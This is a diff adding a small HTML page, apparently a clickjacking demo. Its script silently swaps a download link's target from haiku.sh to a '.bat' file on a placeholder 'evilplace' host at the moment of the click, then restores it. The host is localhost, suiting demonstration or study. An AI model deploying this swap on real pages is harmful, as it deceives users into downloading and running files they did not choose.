@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html
+<head>
+  <style>
+    #download {
+      padding: 2rem;
+      background-color: red;
+    }
+    #center {
+      display:flex;
+      flex-flow: row;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+  <p id="center">
+    <a id="download" download href="http://localhost/aria-pages/forms/clickjack-demo/haiku.sh">click target<div>
+  </p>
+</body>
+<script>
+
+document.getElementById('download').addEventListener('click', function (event) {
+  let target = event.target
+  let ohref = event.target.href
+  event.target.href = 'http://localhost/evilplace/haiku.bat'
+  let timeout = setTimeout(function () {
+    target.href = ohref
+  },500)
+})
+</script>
+</html>
